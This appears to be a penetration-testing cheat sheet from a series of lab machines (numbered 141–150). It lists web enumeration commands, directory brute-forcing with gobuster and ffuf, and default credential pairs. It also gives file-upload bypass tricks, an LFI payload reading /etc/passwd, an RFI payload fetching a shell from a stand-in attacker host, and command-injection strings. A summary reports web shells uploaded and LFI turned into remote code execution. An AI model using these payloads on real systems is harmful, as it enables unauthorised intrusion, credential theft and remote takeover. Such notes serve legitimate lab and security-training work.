## 🌐 Web Enumeration (Machines 141–150)

### Common Web Directories & Pages
```bash
curl -I http://<IP>/admin                # Check for admin panel
curl -I http://<IP>/config.php           # Exposed configuration file
curl -I http://<IP>/.git                 # Look for exposed git directory
curl -I http://<IP>/backup               # Check for backup leaks
```

### Directory Brute Forcing
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### Default Credentials and Login Pages
- admin:admin
- root:toor
- test:test

### Vulnerable File Uploads
- Discovered PHP-based upload forms allowing .php shell upload
- Applied .htaccess or double-extension bypasses (.php.jpg)

### LFI & RFI Checks
```bash
curl http://<IP>/?page=../../../../etc/passwd
curl http://<IP>/?file=http://attacker.com/shell.txt
```

### Command Injection Vectors
```bash
curl http://<IP>/vuln.php?input=;id
curl http://<IP>/vuln.php?input=|whoami
```

### CMS Specific Enumeration
```bash
wpscan --url http://<IP> --enumerate u,vp
joomscan -u http://<IP>
droopescan scan drupal -u http://<IP>
```

### Observations Summary
- Found exposed `.git` and `/uploads` directories in multiple machines
- LFI to RCE achieved in several cases using log poisoning or wrapper inclusion
- Web shells successfully uploaded in 3 cases through weak MIME checking
